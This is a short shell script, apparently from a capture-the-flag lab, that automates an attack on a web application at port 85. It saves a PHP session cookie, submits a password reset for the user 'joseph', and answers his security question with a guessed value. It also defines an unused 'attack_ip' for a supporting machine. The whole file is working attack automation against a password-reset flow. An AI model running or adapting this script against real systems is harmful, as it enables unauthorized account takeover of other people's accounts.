#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:85" -c "/work/cookie-id.txt" -L > /dev/null
PHPSESSID=$(grep PHPSESSID "/work/cookie-id.txt" | awk '{print $7}')
echo "--> Session initiated : $PHPSESSID"

# Reseting joseph password
echo "2 - RESETING JOSEPH PASSWORD"
curl -s -X POST "http://$target_ip:85/resetpass1.php" -b /work/cookie-id.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=joseph" -v

# Answering too easy security question
echo "3 - ANSWERING SECURITY QUESTION"
curl -s -X POST "http://$target_ip:85/resetpass2.php" -b /work/cookie-id.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "q=2" -d "a=red" -v